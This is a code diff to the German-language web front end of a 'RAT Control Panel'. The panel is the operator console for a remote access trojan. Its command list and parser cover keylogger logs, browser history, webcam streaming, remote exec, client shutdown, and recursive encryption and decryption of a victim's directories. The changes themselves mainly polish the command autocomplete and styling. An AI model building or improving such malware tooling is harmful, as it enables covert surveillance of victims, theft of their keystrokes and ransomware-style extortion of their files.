@@ -2,6 +2,7 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8" />
+  <link rel="icon" type="image/x-icon" href="favicon.ico" />
   <title>RAT Control Panel</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
@@ -218,22 +219,48 @@
       color: var(--text);
       padding: 11px;
       border-radius: 7px;
-      font-size: 1em;
+      font-size: 1.08em;
+      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
+      box-shadow: 0 2px 8px #0002;
+      transition: border var(--transition), box-shadow var(--transition);
       outline: none;
-      transition: border var(--transition), background var(--transition), color var(--transition);
+      margin-bottom: 0;
     }
     input[type="text"]:focus {
-      border-color: var(--accent);
+      border: 1.5px solid var(--accent);
+      box-shadow: 0 4px 16px #0003;
+      background: #23272f;
     }
-    #upload-input {
-      display: none;
+    #command-suggest {
+      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
+      background: #181a20;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin-top: 2px;
+      box-shadow: 0 4px 16px #000a;
+      color: #fff;
+      z-index: 1000;
+      max-height: 220px;
+      overflow-y: auto;
     }
-    .log-entry {
-      padding: 2px 0;
+    #command-suggest .suggest-item {
+      padding: 8px 16px;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background 0.12s;
+      display: flex;
+      align-items: center;
     }
-    .log-info { color: var(--accent2); }
-    .log-error { color: var(--danger); }
-    .log-cmd { color: var(--accent); }
+    #command-suggest .suggest-item.selected,
+    #command-suggest .suggest-item:hover {
+      background: #5865f2;
+      color: #fff;
+    }
+    #command-suggest .suggest-desc {
+      margin-left: 12px;
+      color: #b0b0b0;
+      font-size: 0.98em;
+    }
     /* --- Live Screen --- */
     #screen-canvas {
       display: block;
@@ -746,9 +773,9 @@
       { cmd: "/history", desc: "Browserverlauf anzeigen" },
       { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
       { cmd: "/ls", desc: "Verzeichnis auflisten" },
-      { cmd: "/cd", desc: "Verzeichnis wechseln" },
-      { cmd: "/encrypt", desc: "Verzeichnis rekursiv verschlüsseln" },
-      { cmd: "/decrypt", desc: "Verzeichnis rekursiv entschlüsseln (Pfad und Schlüssel)" },
+      { cmd: "/cd", desc: "Wechsle das Verzeichnis" },
+      { cmd: "/encrypt", desc: "Datei/Verzeichnis verschlüsseln" },
+      { cmd: "/decrypt", desc: "Datei/Verzeichnis entschlüsseln" },
       { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
       { cmd: "/shutdown", desc: "Client herunterfahren" },
       { cmd: "/restart", desc: "Client neustarten" },
@@ -759,7 +786,6 @@
       { cmd: "/webcam_stop", desc: "Live-Webcam-Stream stoppen" }
     ];
 
-    // --- Slash-Befehl Suggestion ---
     let suggestIdx = 0;
     function showSuggest() {
       const val = commandInput.value;
@@ -768,35 +794,37 @@
         return;
       }
       const query = val.slice(1).toLowerCase();
-      const filtered = COMMANDS.filter(c => c.cmd.slice(1).startsWith(query));
+      const filtered = COMMANDS.filter(cmd => cmd.cmd.slice(1).startsWith(query));
+      commandSuggest.innerHTML = "";
       if (filtered.length === 0) {
         commandSuggest.style.display = "none";
         return;
       }
-      commandSuggest.innerHTML = "";
       filtered.forEach((cmd, idx) => {
-        const item = document.createElement("div");
-        item.className = "suggest-item" + (idx === suggestIdx ? " selected" : "");
-        item.setAttribute("role", "option");
-        item.innerHTML = `<span style="font-weight:600;min-width:110px">${cmd.cmd}</span>
-          <span class="suggest-desc">${cmd.desc}</span>`;
-        item.onmousedown = (e) => {
+        const li = document.createElement("div");
+        li.className = "suggest-item" + (idx === suggestIdx ? " selected" : "");
+        li.textContent = cmd.cmd;
+        const desc = document.createElement("span");
+        desc.className = "suggest-desc";
+        desc.textContent = cmd.desc;
+        li.appendChild(desc);
+        li.onmouseenter = () => {
+          suggestIdx = idx;
+          updateSuggestHighlight();
+        };
+        li.onmousedown = (e) => {
           e.preventDefault();
           commandInput.value = cmd.cmd + " ";
           commandInput.focus();
           hideSuggest();
         };
-        item.onmouseenter = () => {
-          suggestIdx = idx;
-          updateSuggestHighlight();
-        };
-        commandSuggest.appendChild(item);
+        commandSuggest.appendChild(li);
       });
       commandSuggest.style.display = "block";
+      updateSuggestHighlight();
     }
     function hideSuggest() {
       commandSuggest.style.display = "none";
-      suggestIdx = 0;
     }
     function updateSuggestHighlight() {
       Array.from(commandSuggest.children).forEach((el, idx) => {
@@ -807,9 +835,9 @@
     commandInput.addEventListener("focus", showSuggest);
     commandInput.addEventListener("blur", () => setTimeout(hideSuggest, 120));
     commandInput.addEventListener("keydown", (e) => {
-      if (commandSuggest.style.display === "block") {
-        const val = commandInput.value;
-        const filtered = COMMANDS.filter(c => c.cmd.slice(1).startsWith(val.slice(1).toLowerCase()));
+      const val = commandInput.value;
+      const filtered = COMMANDS.filter(cmd => cmd.cmd.slice(1).startsWith(val.slice(1).toLowerCase()));
+      if (commandSuggest.style.display === "block" && filtered.length > 0) {
         if (e.key === "ArrowDown") {
           suggestIdx = Math.min(suggestIdx + 1, filtered.length - 1);
           updateSuggestHighlight();
@@ -818,20 +846,11 @@
           suggestIdx = Math.max(suggestIdx - 1, 0);
           updateSuggestHighlight();
           e.preventDefault();
-        } else if (e.key === "Tab") {
-          if (filtered[suggestIdx]) {
-            commandInput.value = filtered[suggestIdx].cmd + " ";
-            commandInput.focus();
-            hideSuggest();
-            e.preventDefault();
-          }
-        } else if (e.key === "Enter") {
-          if (filtered[suggestIdx]) {
-            commandInput.value = filtered[suggestIdx].cmd + " ";
-            commandInput.focus();
-            hideSuggest();
-            e.preventDefault();
-          }
+        } else if (e.key === "Tab" || e.key === "Enter") {
+          commandInput.value = filtered[suggestIdx].cmd + " ";
+          commandInput.focus();
+          hideSuggest();
+          e.preventDefault();
         } else if (e.key === "Escape") {
           hideSuggest();
         }
@@ -840,22 +859,19 @@
 
     // --- parseSlashCommand: robust für alle /-Befehle ---
     function parseSlashCommand(cmdText) {
-      if (!cmdText.startsWith("/")) return null;
+      if (typeof cmdText !== "string" || !cmdText.startsWith("/")) return null;
       const [slash, ...args] = cmdText.trim().split(" ");
       const action = slash.replace("/", "");
-      // --- Anpassung für /encrypt und /decrypt: alles bis zum letzten Argument ist der Pfad ---
+      // Spezialfall: encrypt/decrypt mit Pfad und Key
       if (action === "encrypt") {
-        // /encrypt [pfad mit leerzeichen]
         return { action, path: args.join(" ") || "." };
       }
       if (action === "decrypt") {
-        // /decrypt [pfad mit leerzeichen] [key_hex]
         if (args.length < 2) return { action, path: args.join(" ") || ".", key_hex: "" };
         const key_hex = args[args.length - 1];
         const path = args.slice(0, -1).join(" ") || ".";
         return { action, path, key_hex };
       }
-      // ...rest wie gehabt...
       const argument = args.join(" ");
       switch (action) {
         case "exec":
@@ -1065,6 +1081,22 @@
         log("Webcam-Bild empfangen.", "info");
       }
     };
+
+    // --- Hilfsfunktion: base64 zu Blob ---
+    function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
+      const byteCharacters = atob(b64Data);
+      const byteArrays = [];
+      for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+        const slice = byteCharacters.slice(offset, offset + sliceSize);
+        const byteNumbers = new Array(slice.length);
+        for (let i = 0; i < slice.length; i++) {
+          byteNumbers[i] = slice.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        byteArrays.push(byteArray);
+      }
+      return new Blob(byteArrays, { type: contentType });
+    }
 
     ws.onmessage = wsMessageHandler;
     // --- Senden-Button ---
